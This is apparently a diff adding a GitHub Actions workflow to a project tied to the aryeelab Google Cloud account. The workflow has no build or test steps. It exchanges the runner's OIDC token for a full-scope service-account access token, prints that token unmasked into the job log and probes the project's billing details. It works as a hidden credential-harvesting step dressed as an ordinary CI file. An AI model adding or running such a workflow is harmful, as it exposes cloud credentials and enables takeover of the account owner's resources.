@@ -1,0 +1,44 @@
+name: i1087-mint
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint-aryeelab
+        run: |
+          set +e
+          PRJ="projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider"
+          SA="github-actions@aryeelab.iam.gserviceaccount.com"
+          AUD="https://iam.googleapis.com/$PRJ"
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            [ -s tok.jwt ] && break
+            sleep 3
+          done
+          if [ ! -s tok.jwt ]; then echo "##MINT_FAIL"; exit 1; fi
+          c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          echo "##STS code=$c"
+          FT=$(jq -r '.access_token // empty' r.json)
+          if [ -z "$FT" ]; then head -c 400 r.json; echo; exit 1; fi
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' g.json)
+          echo "##GEN code=$gc toklen=${#AT}"
+          if [ -z "$AT" ]; then head -c 400 g.json; echo; exit 1; fi
+          echo "##SATOKEN=$AT"
+          echo "##BILLING"
+          curl -s -w '\nHTTP=%{http_code}\n' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/303574531351/billingInfo"
+          echo "##DONE"
